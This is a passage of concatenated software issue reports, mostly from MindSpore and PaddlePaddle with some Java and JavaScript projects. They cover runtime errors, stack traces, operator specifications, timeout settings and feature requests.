&gt; (avg_pool): AvgPool2d&lt;kernel_size=2, stride=2, pad_mode=VALID&gt; (relu): ReLU&lt;&gt; &gt; &gt; &gt; phase = '13train.1602787111025297152', do_convert = True auto_parallel_mode = False args = (Tensor(shape=[2, 4, 128, 64], dtype=UInt8, value= [[[[ 0, 0, 0 ... 0, 0, 255], [ 0, 1, 0 ... 0, ... [ 0, 0, 255 ... 0, 1, 255]]]]), Tensor(shape=[2], dtype=Float32, value= [ 4.72305000e-01, 5.83360612e-01])) def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.check_names() _check_full_batch() args_names, args_list = _generate_pip_args(obj, *args) dic = dict(zip(args_names, args_list)) key = generate_key(phase, dic) self.phase_prefix = str(key[1]) if 'export' in phase: phase = phase + '.' + self.phase_prefix + '.' + str(obj.create_time) else: phase = self.phase_prefix + phase + '.' + str(obj.create_time) enable_debug_runtime = context.get_context(""enable_debug_runtime"") enable_ge = context.get_context(""enable_ge"") use_vm = not enable_ge or (enable_debug_runtime and context.get_context(""mode"") == context.PYNATIVE_MODE) self._set_dataset_mode(args_list) if phase in self.compile_cache.keys(): logger.debug(""%r graph has existed."", phase) return phase, False is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run(): args_full = _to_full_tensor(args, _get_device_num(), _get_global_rank()) _, args_list = _generate_pip_args(obj, *args_full) &gt; result = self._executor.compile(obj, args_list, phase, use_vm) E RuntimeError: mindspore/ccsrc/backend/optimizer/ascend/format_type/convert_unsupported_transnode_to_aicpu.cc:49 Process] kernel (&lt;UInt8xNC1HWC0&gt;) -&gt; (&lt;UInt8xDefaultFormat&gt;)is not supported in AiCPU &amp; AiCore : node [kernel_graph_13:[CNode]13035{[0]: ValueNode&lt;Primitive&gt; TransData, [1]: dx}] /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py:412: RuntimeError"
Check memory use in unit test,A recent TeamCity CI build https://paddleci.ngrok.io/viewLog.html?buildId=4623&amp;buildTypeId=Paddle_PrCi&amp;tab=buildLog failed with the following errors:   <code>: [21:45:26] 104/106 Test #34: test_matrixCompare ..................***Exception: Other282.47 sec [21:45:26] I0805 04:40:48.090028 26863 Util.cpp:166] commandline: /paddle/build/paddle/math/tests/test_matrixCompare [21:45:26] [==========] Running 16 tests from 4 test cases. [21:45:26] [----------] Global test environment set-up. [21:45:26] [----------] 12 tests from Matrix [21:45:26] [ RUN ] Matrix.maxSequence [21:45:26] [ OK ] Matrix.maxSequence (233 ms) [21:45:26] [ RUN ] Matrix.unary [21:45:26] [ OK ] Matrix.unary (750 ms) [21:45:26] [ RUN ] Matrix.softmax [21:45:26] [ OK ] Matrix.softmax (113 ms) [21:45:26] [ RUN ] Matrix.tableProjection [21:45:26] [ OK ] Matrix.tableProjection (196 ms) [21:45:26] [ RUN ] Matrix.mul [21:45:26] [ OK ] Matrix.mul (9001 ms) [21:45:26] [ RUN ] Matrix.topK [21:45:26] [ OK ] Matrix.topK (46882 ms) [21:45:26] [ RUN ] Matrix.sequenceAvg [21:45:26] [ OK ] Matrix.sequenceAvg (299 ms) [21:45:26] [ RUN ] Matrix.paramReluBackwardDiff [21:45:26] [ OK ] Matrix.paramReluBackwardDiff (90 ms) [21:45:26] [ RUN ] Matrix.classificationError [21:45:26] [ OK ] Matrix.classificationError (37883 ms) [21:45:26] [ RUN ] Matrix.PoolFwdBwd [21:45:26] [ OK ] Matrix.PoolFwdBwd (65398 ms) [21:45:26] [ RUN ] Matrix.MaxOutFwdBwd [21:45:26] [ OK ] Matrix.MaxOutFwdBwd (730 ms) [21:45:26] [ RUN ] Matrix.warpCTC [21:45:26] F0805 04:44:10.214592 26863 hl_cuda_device.cc:290] Check failed: cudaSuccess == cudaStat (0 vs. 2) Cuda Error: out of memory [21:45:26] *** Check failure stack trace: *** [21:45:26] @ 0xaa044d google::LogMessage::Fail() [21:45:26] @ 0xaa2798 google::LogMessage::SendToLog() [21:45:26] @ 0xa9ff3b google::LogMessage::Flush() [21:45:26] @ 0xaa366e google::LogMessageFatal::~LogMessageFatal() [21:45:26] @ 0x100b343 hl_malloc_host() [21:45:26] @ 0xd5a0c2 paddle::CudaHostAllocator::alloc() [21:45:26] @ 0xd470d9 paddle::PoolAllocator::alloc() [21:45:26] @ 0xd46d23 paddle::CpuMemoryHandle::CpuMemoryHandle() [21:45:26] @ 0xd0e16c __gnu_cxx::new_allocator&lt;&gt;::construct&lt;&gt;() [21:45:26] @ 0xd0e0e3 std::allocator_traits&lt;&gt;::construct&lt;&gt;() [21:45:26] @ 0xd0df76 std::_Sp_counted_ptr_inplace&lt;&gt;::_Sp_counted_ptr_inplace&lt;&gt;() [21:45:26] @ 0xd0dca9 std::__shared_count&lt;&gt;::__shared_count&lt;&gt;() [21:45:26] @ 0xd0dade _ZNSt12__shared_ptrIN6paddle15CpuMemoryHandleELN9__gnu_cxx12_Lock_policyE2EEC2ISaIS1_EJmEEESt19_Sp_make_shared_tagRKT_DpOT0_ [21:45:26] @ 0xd0da3a _ZNSt10shared_ptrIN6paddle15CpuMemoryHandleEEC2ISaIS1_EJmEEESt19_Sp_make_shared_tagRKT_DpOT0_ [21:45:26] @ 0xd0d865 std::allocate_shared&lt;&gt;() [21:45:26] @ 0xd0d6d3 std::make_shared&lt;&gt;() [21:45:26] @ 0xd82219 paddle::CpuMatrix::CpuMatrix() [21:45:26] @ 0xa8e543 autotest::CopyToCpu&lt;&gt;::CopyToCpu() [21:45:26] @ 0xa8f960 autotest::TensorCheckErr&lt;&gt;() [21:45:26] @ 0xa8ca51 testBatch2seqPadding() [21:45:26] @ 0xa8cd87 Matrix_warpCTC_Test::TestBody() [21:45:26] @ 0x111bf63 testing::internal::HandleExceptionsInMethodIfSupported&lt;&gt;() [21:45:26] @ 0x11124fa testing::Test::Run() [21:45:26] @ 0x1112648 testing::TestInfo::Run() [21:45:26] @ 0x1112755 testing::TestCase::Run() [21:45:26] @ 0x1114bf7 testing::internal::UnitTestImpl::RunAllTests() [21:45:26] @ 0x1114f29 testing::UnitTest::Run() [21:45:26] @ 0x10f57d9 RUN_ALL_TESTS() [21:45:26] @ 0x10f5768 main [21:45:26] @ 0x7fb6a58d2830 __libc_start_main [21:45:26] @ 0xa81019 _start [21:45:26] @ (nil) (unknown)
 [新功能] 添加Visual Studio Code 开发环境支持,支持 附加到进程   <code>: .vscode Visual Studio Code Visual Studio Code Visual Studio Code
【众智】【计算-AICPU接入】Log,AICPU算子接入 算子交付规格-支持类型：float16， float32，float64(仅正向)，complex64(仅正向)，complex128(仅正向) （float64，complex64，complex128三种类型的反向由于包含算子受框架隐式类型转换限制，暂不支持反向）。 以自然常数e为底的对数函数 x y 对应底层算子 对应底层AI CPU算子Log Classify Name Type Type Range Required Format INPUT x UnaryDataType TRUE OUTPUT y UnaryDataType TRUE ATTR base Float FALSE ATTR scale Float FALSE ATTR shift Float FALSE 标杆接口参考 TF接口： https://www.tensorflow.org/api_docs/python/tf/raw_ops/Log 3. 异常处理 4. 算子反向 参考TF反向函数_LogGrad tensorflow/tensorflow/python/ops/math_grad.py _LogGrad   <code>: class Log(PrimitiveWithInfer):
[CT][MS][OP]  The MatrixDiagV3 testcase's error reporting information is not clear,"MatrixDiagV3异常用例报错信息不明确 当padding的shape大于1时，ascend两种模式和CPU的pynative模式报错信息不明确。 / 硬件环境: /device cpu : -- MindSpore version : master -- Python version : Python 3.7.5 -- OS platform and distribution : Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph test_matrix_diag_v3_x_int8_3d_padding_size_error: pytest -s test_matrix_diag_v3.py::test_matrix_diag_v3_x_int8_3d_padding_size_error raise error and show the error reporting information clearly   <code>: def test_matrix_diag_v3_x_int8_3d_padding_size_error(): x = Tensor(np.random.randint(-100, 100, (7, 3, 3)).astype(np.int8), dtype=mstype.int8) k = Tensor(np.array([-1, 1]).astype(np.int32), dtype=mstype.int32) num_rows = Tensor(np.array([3]).astype(np.int32), dtype=mstype.int32) num_cols = Tensor(np.array([3]).astype(np.int32), dtype=mstype.int32) padding_value = Tensor(np.array([11, 12]).astype(np.int8), dtype=mstype.int8) input_list = [x, k, num_rows, num_cols, padding_value] fact = MatrixDiagV3Mock(attributes={""align"": 'RIGHT_RIGHT'}, inputs=[input_list]) with pytest.raises(TypeError): fact.forward_cmp() ../share/ops/primitive/matrixdiagv3_ops.py:90: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../share/ops/primitive/matrixdiagv3_ops.py:44: in forward_mindspore_impl out = net(*self.input_x) ../share/utils.py:181: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/nn/cell.py:496: in __call__ raise err /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/nn/cell.py:493: in __call__ output = self.run_construct(cast_inputs, kwargs) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/nn/cell.py:380: in run_construct output = self.construct(*cast_inputs, **kwargs) ../share/ops/primitive/matrixdiagv3_ops.py:24: in construct return self.matrix_diag_v3(x, self.k, self.num_rows, self.num_cols, padding_value) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/ops/primitive.py:288: in __call__ return _run_op(self, self.name, args) /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/common/api.py:62: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ obj = Prim[MatrixDiagV3]&lt;align=RIGHT_RIGHT, cust_aicpu=MatrixDiagV3, max_length=200000000&gt;, op_name = 'MatrixDiagV3' args = (Tensor(shape=[7, 3, 3], dtype=Int8, value= [[[ -12, -64, -27], [ 4, -35, 33], [ -41, -44, 93]], [[ 37..., dtype=Int32, value= [3]), Tensor(shape=[1], dtype=Int32, value= [3]), Tensor(shape=[2], dtype=Int8, value= [11, 12])) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E RuntimeError: mindspore/ccsrc/runtime/framework/actor/kernel_actor.cc:214 OnMemoryAllocFinish] Launch kernel exception: Default/MatrixDiagV3-op83"
RNN roadmap for refactoring,"RNN is a big concept to support in our refactoring. Based on the current support of our framework, it is better to implement RNNs in following stages: , an RNN operator that takes a tensor as input , an RNN that takes variable-length sequences as input, and output sequences as output should replace the built-in , that will be a method in and make the an equivalent of the old . dynamic RNN based on and some other conditional operators, after we support this, the infrastructure might apply to some other dynamic models such as Tree-LSTM and so on. dynamic beam search, that is a beam search built on and other conditional operations. Milestones support neural machine translation model with a built-in beam search module should be ready at that point. a text classification model with dynamic RNNs, the operators not limited to the following ones should be ready machine translation model based on dynamic beam search (maybe wrapped as ) that needs more dynamic operators ready   <code>: recurrent_op dynamic_recurrent_op recurrent_op beam search dynamic_recurrent_op dynamic_recurrent_op RecurrentGradientMachine while_loop while_loop dynamic_recurrent_op pd.while_loop pd.equals pd.TensorArray pd.less_than generator"
将timeout细化为connectTimeout和readTimeout,将timeout细化为connectTimeout和readTimeout。 添加两个超时时间属性： 连接超时时间 读取超时时间 原本的属性将不再建议使用   <code>: connectTimeout readTimeout timeout
npm run start ReferenceError: window is not defined,使用 npm run start 运行时node服务报错   <code>: ReferenceError: window is not defined at getStore (src/util/store.js:22:4) at Object.&lt;anonymous&gt; (src/store/modules/user.js:11:23) at __webpack_require__ (webpack:/webpack/bootstrap a6eec9ebc78d06967fb3:25:0) at Object.&lt;anonymous&gt; (server-bundle.js:932:72) at __webpack_require__ (webpack:/webpack/bootstrap a6eec9ebc78d06967fb3:25:0) at Object.&lt;anonymous&gt; (server-bundle.js:1947:65) at __webpack_require__ (webpack:/webpack/bootstrap a6eec9ebc78d06967fb3:25:0) at Object.module.exports.Object.defineProperty.value (server-bundle.js:2961:72) at __webpack_require__ (webpack:/webpack/bootstrap a6eec9ebc78d06967fb3:25:0) at Object.&lt;anonymous&gt; (server-bundle.js:7309:64) at __webpack_require__ (webpack:/webpack/bootstrap a6eec9ebc78d06967fb3:25:0) at module.exports.module.exports.rawScriptExports (webpack:/webpack/bootstrap a6eec9ebc78d06967fb3:93:0) at Object.&lt;anonymous&gt; (server-bundle.js:98:10) at evaluateModule (D:\Projects\avue\node_modules\vue-server-renderer\build.js:8344:21) at D:\Projects\avue\node_modules\vue-server-renderer\build.js:8402:18 at new Promise (&lt;anonymous&gt;)
"[CT][MS][lite][r1.9]ml_facelandmark.pb+fullquant, the accuracy is worse than before.","| name | about | labels | | ---------- | ------------------------------------- | -------- | | Bug Report | Use this template for reporting a bug | kind/bug | ml_facelandmark.pb+fullquant， 精度相比之前版本有所劣化 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 推理成功，精度达标 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph   <code>: 1.export GLOG_v=1;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/data/local/tmp/lib;export MSLITE_API_TYPE=1;logcat -c;cd /data/local/tmp/; ./new_net_test_mslite GE_NET_LITE_new_net_fullquant https://testreporter.szv.dragon.tools.huawei.com/TestDataBot/analysis/taskdetailes?productId=digitalenergy&amp;productLine=2012%20Laboratories&amp;taskId=6413269974719135744&amp;tmssPath=%2F00lsa3bkvql%2F00osa3d3cs7%2F00tt18amo4r%2F&amp;title=MSLITE_TEST_INFERENCE_CPU_FP32_FULLQUANT_2022-10-27%2005:17:07&amp;testcaseid=62f429f4bbc1db003020fa2a&amp;workspaceId=6359a0b02e6d0a1aed723189&amp;isMergedTask=false&amp;nodeDate=2022-10-27&amp;cidaProjectId=f990cb34dcbb462b8836fb589a44ccf6 [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1576][DEBUG]checkAccuracyLossRateAsExpected: cosSimilarity checking of tensor [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1485][DEBUG]cosSimilarity checking of tensor [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1615][Check][Result][Pass][landmark_squeeze]accepted=0.990000,actual=0.999912 [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1576][DEBUG]checkAccuracyLossRateAsExpected: cosSimilarity checking of tensor [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1485][DEBUG]cosSimilarity checking of tensor [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1617][Check][Result][Failed][headpose_squeeze]accepted=0.960000,actual=0.883044 [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1576][DEBUG]checkAccuracyLossRateAsExpected: cosSimilarity checking of tensor [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1485][DEBUG]cosSimilarity checking of tensor [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1615][Check][Result][Pass][left_eye_occlusion_classification_squeeze]accepted=0.990000,actual=1.000000 [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1576][DEBUG]checkAccuracyLossRateAsExpected: cosSimilarity checking of tensor [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1485][DEBUG]cosSimilarity checking of tensor [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1615][Check][Result][Pass][right_eye_occlusion_classification_squeeze]accepted=0.990000,actual=1.000000 [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1576][DEBUG]checkAccuracyLossRateAsExpected: cosSimilarity checking of tensor [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1485][DEBUG]cosSimilarity checking of tensor [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1615][Check][Result][Pass][mouth_occlusion_classification_squeeze]accepted=0.990000,actual=1.000000 [MS_LITE_TEST][05:03:39 2022/10/27][new_net_test_mslite.cpp:1699][FAILED]MsLiteTestResultAccuracyLossRateCheckFail:-7 Assertion Failed"
微服务版 自定义过滤器问题,"在gateway工程中新建了一个过滤器（过滤W项目）但是不生效 过滤器代码如下： 但在我把目标项目（W项目）关闭后就能进入过滤器了。nacons中配置如下 断点可以看到   <code>: @Component public class MyFilter extends AbstractNameValueGatewayFilterFactory { @Override public GatewayFilter apply(NameValueConfig config) { //可以取到值，说明配置没问题 config.getValue(); return new OrderedGatewayFilter((ServerWebExchange exchange, GatewayFilterChain chain) -&gt; { //请求不进入，直接转发到了对应服务 HttpMethod method = exchange.getRequest().getMethod(); return chain.filter(exchange); },Ordered.HIGHEST_PRECEDENCE); }; } - id: printer-wx-admin uri: lb://printer-wx-admin predicates: - Path=/printer-wx-admin/** filters: - MyFilter=a,1 - StripPrefix=1"
使用sql server数据库时候，MetaBuilder 的dialect无法转换成SqlServerDialect,使用sql server数据库时候，dialect无法转换成SqlServerDialect public class MetaBuilder {   <code>: protected DataSource dataSource; protected Dialect dialect = new MysqlDialect();
fuse batch normalization ,"Motivation The batch normalization followed the convolution or fully connected layer can be integrated with them. Doing so will give us a forward acceleration(about 30% in mobilenet) during inference. Implementation There are two simple examples: conv without bias: should be changed to conv with bias: should be changed to Thus, there are three~four stages when fusing batch normalization: insert op, its input is the output of (this stage is only for conv without bias) fuse the 's parameters to and remove ops and its variables which not used in any other ops. adjust the input of to be the output of , and remove unused variables again. V2 implementation #6704:Fix equation of sequence_softmax_op. by @NHZlX and a demo in mobile repo. fluid implementation We plan to use an inference transpiler to implement fuse batch normalization. Before this transpiler, we should implement: method for stage 1: #9747:Upgrade pip version to 10 method for stage 3: #9384:fluid 版本的word2vec如何导出embedding table? #9600:production docker file failed at copying pserver to /usr/bin #9816:Same Model But Different Infer Result! method for stage 4: #9607:有人用paddle这翻译模型做了英译中的工作吗   <code>: conv-&gt;batch_norm-&gt;any_other_op conv-&gt;elementwise_add (bias)-&gt;any_other_op conv-&gt;elementwise_add (bias)-&gt;batch_norm-&gt;any_other_op conv-&gt;elementwise_add (bias)-&gt;any_other_op elementwise_add conv batch_norm conv elementwise_add batch_norm any_other_op elementwise_add insert_op remove_op remove_var"
js设置select的val后，下拉列表选中状态更新了，但是输入框值没更新,"select代码如下： js代码如下： 操作后的表现如下： 期望是输入框的值也随着一起更新掉；如果是我哪里操作不当还请指导下，layui挺好用的，点赞！   <code>: &lt;div class=""layui-form-item""&gt; &lt;label class=""layui-form-label""&gt;类型：&lt;/label&gt; &lt;div class=""layui-input-block""&gt; &lt;select id=""float-form-type""&gt; &lt;option value=""""&gt;&lt;/option&gt; &lt;option value=""mtop""&gt;mtop&lt;/option&gt; &lt;option value=""pizza""&gt;pizza&lt;/option&gt; &lt;option value=""image""&gt;image&lt;/option&gt; &lt;option value=""orange""&gt;orange&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;/div&gt; $(""#type-select"").val('mtop')"
thinkphp6 自定义指令下调用的model，使用redis缓存会报错,同一个model方法在 控制器中调用 并通过url访问 正确 通过自定义指令调用 报错，报错内容如下： model方法中使用了Cache::get(); Cache使用的是redis   <code>: [InvalidArgumentException] Unable to resolve NULL driver for [think\Cache].
Defects of Python API,"The Python API of Paddle is developed originally for Paddle model inference and custom Paddle training progress. It was an experimental project for Paddle and just exposed every APIs from C++ when developer using it. It is important to have a plan for python API and fix some essential defects about it. The defects of API are listed below: In Paddle, there are many global variables, which may lead to some error when loading multiple models. Related issue #601:refine dataprovider related rst. The command line flags are global variables, but some of them should be configured by each neural network, instead of global variables. FLAGS_use_gpu is used to configure a neural network using GPU or not. When using , there is one neural network trained by Paddle, so the global variable doesn't matter. However, it is reasonable for users to train multiple neural networks in one program when using Paddle as a library. FLAGS_gpu_id is not appropriate for the same reason as above. The possible flags are in Flags.h. The global variables in configuration file parser. In trainer config helpers, there are some decorators use global variables. It should be fixed or give an easy way to reset global variables. There may be other global variables which are not listed here. The and errors in Paddle. The design philosophy in Paddle is . There are many and in Paddle code. How to handle them correctly in Paddle library is very important. Because it should not exit the user program when some operations are illegal. The PyDataProvider2 and the config file parsing in Paddle process. There is a python interpreter embedded inside Paddle to parsing configuration file and loading data. It forces users to split one python script to three scripts when using Python library. The c++ APIs are not all exposed. Several levels of APIs for Paddle are listed below. The Trainer API. Trainer API is the highest level API. It contains , , , etc. They were exposed and we should check whether current API is enough for Trainer. The GradientMachine API. The Gradient Machine is an abstract for the neural network. By using GradientMachine API, users can customise training progress. Users can a neural network 10 times, and do . This API were partially exposed and we should expose them all. The Layer API. API to control each layer forward and backwards. It seems that these APIs are not useful now, and none of them is exposed. The Matrix API. APIs to use Paddle matrix in Python. They are partially exposed, should work for feeding Data to GradientMachine. We should check whether current API is enough. The Util API. APIs for Paddle utilities, such as threading, networking, etc. None of them is exposed basically, except some API for parsing command line arguments, initialization for Paddle process.   <code>: paddle train use_gpu LOG(FATAL) CHECK crash as soon as possible LOG(FATAL) CHECK * Also, the process model is very confusing. The call stack when using python library will be `Python =&gt; Paddle =&gt; Python`. The two python interpreters in one process may share some global variable, lead to some unknown behaviour. loadModel trainOnePass trainOneMiniBatch forward backwards"
Spring Boot工程配置forest.connect-timeout不生效,"版本 Forest: 1.5.0 Backend: okhttp:3.8.1、httpclient:4.5.9 问题 Spring Boot工程在配置Forest连接超时时间forest.connect-timeout = 10000不生效 原因 查看OkHttp3ConnectionManager和HttpclientConnectionManager源码，发现： okhttp设置connectTimeout和readTimout都是用的forest.timeout配置 httpclient设置setConnectTimeout和setSocketTimeout使用的forest.timeout配置，代码如下： 疑问 不知道开发者为啥这样做，是否出于某些原因，如果是出于某些原因，应该修改官方文档去掉forest.connect-timeout配置说明，并修改forest.timeout配置的作用   <code>: public OkHttpClient getClient(ForestRequest request, LifeCycleHandler lifeCycleHandler) { // 省略代码.............. OkHttpClient.Builder builder = new OkHttpClient.Builder() .connectionPool(pool) .connectTimeout(timeout, TimeUnit.MILLISECONDS) .readTimeout(timeout, TimeUnit.MILLISECONDS) .cookieJar(new CookieJar() { @Override public void saveFromResponse(HttpUrl url, List&lt;Cookie&gt; okCookies) { ForestCookies cookies = new ForestCookies(); for (Cookie okCookie: okCookies) { ForestCookie cookie = ForestCookie.createFromOkHttpCookie(okCookie); cookies.addCookie(cookie); } lifeCycleHandler.handleSaveCookie(request, cookies); } public HttpClient getHttpClient(ForestRequest request, CookieStore cookieStore) { //省略代码........... RequestConfig.Builder configBuilder = RequestConfig.custom(); // 设置连接超时 configBuilder.setConnectTimeout(request.getTimeout()); // 设置读取超时 Integer timeout = request.getTimeout(); if (timeout == null) { timeout = request.getConfiguration().getTimeout(); } configBuilder.setSocketTimeout(timeout); // 设置从连接池获取连接实例的超时 configBuilder.setConnectionRequestTimeout(HttpConnectionConstants.DEFAULT_READ_TIMEOUT); // 省略代码........."
Error caused by 'import paddle.v2.fluid as fluid':  No module named registry,"好像是https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/v2/fluid/layers/math_op_patch.py#L16 文件里找不到registry模块 报错信息： git commit id: c80af6ffaa7362dc23ca87ae9be1a8467ee948f0   <code>: &gt;&gt;&gt; import paddle.v2.fluid Traceback (most recent call last): File ""&lt;stdin&gt;"", line 1, in &lt;module&gt; File ""/home/zhangchao/.jumbo/lib/python2.7/site-packages/paddle/v2/fluid/__init__.py"", line 24, in &lt;module&gt; import evaluator File ""/home/zhangchao/.jumbo/lib/python2.7/site-packages/paddle/v2/fluid/evaluator.py"", line 17, in &lt;module&gt; import layers File ""/home/zhangchao/.jumbo/lib/python2.7/site-packages/paddle/v2/fluid/layers/__init__.py"", line 27, in &lt;module&gt; import math_op_patch File ""/home/zhangchao/.jumbo/lib/python2.7/site-packages/paddle/v2/fluid/layers/math_op_patch.py"", line 16, in &lt;module&gt; from ..registry import OpProtoHolder ImportError: No module named registry"
v2 api parameters.get not returning value of parameters.set,"The array being printed second time is still a non-initialized array. I think it's because https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/v2/parameters.py#L126 parameters will always return a non-initialized array even after parameter has being set. From users' standpoint, I think get should return the array being set regardless parameters is attached to gradient machine or not.   <code>: for param_name in parameters.keys(): array = parameters.get(param_name) array = numpy.random.uniform(low=-1.0, high=1.0, size=array.shape) print array # 1st time parameters.set(parameter_name=param_name, value=array) for param_name in parameters.keys(): array = parameters.get(param_name) print array # 2nd time if len(self.__gradient_machines__) == 0: # create new parameter in python numpy. return np.ndarray(shape=shape, dtype=np.float32)"
使用了 Authorize 后每个接口都自动有一个 Header ，即使注销了还会存在，而且还不能为空，每次必须手动移除才能发送请求,大概知道配置了 Authorize 后也就是给每个接口的Header中加入了这个 Token 。但是注销后，每个接口的 Header 中还会有这个参数存在并且默认勾选上，只是值为空，进行请求时会提示，还需要手动将其取消勾选或者删除，会很麻烦。 因为我这里的 Token 也是调接口获取到的，并且也会有一些接口不需要 Authorize ，即使是没有 Authorize 也希望是后台反馈一个消息，而不是因为 为空而无法发送请求。 所以，期望的是注销了 Authorize 后，每个接口的 Header 中的参数能够取消默认勾选或者删除掉。   <code>: Authentication 请求头 Authentication 不能为空 forbidden Authentication Authentication
"[ST][MS][NET][resnet50][win]RuntimeError: For 'Tile', input shape can not be greate than default max size: 8 and output shape: 4, but got input shape 8","resnet50网络在windows环境上训练报Tile算子错误 / 硬件环境: /device CPU(win) : -- MindSpore version :r1.9 commit_id:4030fed4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220908 MindSpore 版本：编译时间20220914181553 r1.9.0 commit_id:4030fed4 (/): /mode graph test_ms_resnet50_cifar10_win_train_infer_0001.py cd solution_test/cases/02network/00cv/resnet50/train pytest -s test_ms_resnet50_cifar10_win_train_infer_0001.py 网络训练成功 走给梁成辉   <code>: Traceback (most recent call last):^M File ""train.py"", line 377, in &lt;module&gt;^M train_net()^M File ""D:\workspace\solution_test\cases\02network\00cv\resnet50\train\test_ms_resnet50_cifar10_win_train_infer_0001\src\model_utils\moxing_adapter.py"", line 104, in wrapped_func^M run_func(*args, **kwargs)^M File ""train.py"", line 370, in train_net^M sink_size=dataset.get_dataset_size(), dataset_sink_mode=dataset_sink_mode)^M File ""D:\Python37\lib\site-packages\mindspore\train\model.py"", line 1050, in train^M initial_epoch=initial_epoch)^M File ""D:\Python37\lib\site-packages\mindspore\train\model.py"", line 98, in wrapper^M func(self, *args, **kwargs)^M File ""D:\Python37\lib\site-packages\mindspore\train\model.py"", line 617, in _train^M self._train_process(epoch, train_dataset, list_callback, cb_params, initial_epoch, valid_infos)^M File ""D:\Python37\lib\site-packages\mindspore\train\model.py"", line 908, in _train_process^M outputs = self._train_network(*next_element)^M File ""D:\Python37\lib\site-packages\mindspore\nn\cell.py"", line 591, in __call__^M out = self.compile_and_run(*args)^M File ""D:\Python37\lib\site-packages\mindspore\nn\cell.py"", line 982, in compile_and_run^M return _cell_graph_executor(self, *new_inputs, phase=self.phase)^M File ""D:\Python37\lib\site-packages\mindspore\common\api.py"", line 1191, in __call__^M return self.run(obj, *args, phase=phase)^M File ""D:\Python37\lib\site-packages\mindspore\common\api.py"", line 1228, in run^M return self._exec_pip(obj, *args, phase=phase_real)^M File ""D:\Python37\lib\site-packages\mindspore\common\api.py"", line 98, in wrapper^M results = fn(*arg, **kwargs)^M File ""D:\Python37\lib\site-packages\mindspore\common\api.py"", line 1210, in _exec_pip^M return self._graph_executor(args, phase)^M RuntimeError: For 'Tile', input shape can not be greater than default max size: 8 and output shape: 4, but got input shape 8^M ^M ----------------------------------------------------^M - C++ Call Stack: (For framework developers)^M ----------------------------------------------------^M mindspore\ccsrc\plugin\device\cpu\kernel\tile_cpu_kernel.cc:37 TileMultipleCompute^M"
Feature request: bi tempered loss,PaddlePaddle是否有实现的计划？ 这是google最近提出的一种降低噪声数据对模型训练影响的loss损失函数 相关资料： https://arxiv.org/abs/1906.03361 https://ai.googleblog.com/2019/08/bi-tempered-logistic-loss-for-training.html   <code>: bi tempered loss
